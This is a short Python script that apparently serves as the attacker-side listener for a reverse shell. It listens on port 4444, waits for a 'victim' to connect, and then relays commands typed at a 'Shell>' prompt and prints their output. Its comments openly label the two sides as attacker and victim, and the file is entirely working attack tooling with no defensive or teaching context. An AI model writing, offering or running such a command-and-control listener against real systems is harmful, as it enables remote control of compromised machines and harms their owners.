import socket

# Server IP and Port
HOST = '0.0.0.0'  # Listen on all available interfaces
PORT = 4444       # You can change this to any open port

# Create a socket object
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"[+] Listening for incoming connections on port {PORT}...")

# Accept connection from victim
client_socket, client_address = server.accept()
print(f"[+] Connection established with {client_address}")

while True:
    # Take input command from attacker
    command = input("Shell> ")

    if command.lower() == "exit":
        client_socket.send(command.encode())
        break

    # Send command to victim
    client_socket.send(command.encode())

    # Receive the result
    result = client_socket.recv(4096).decode()
    print(result)

client_socket.close()
server.close()
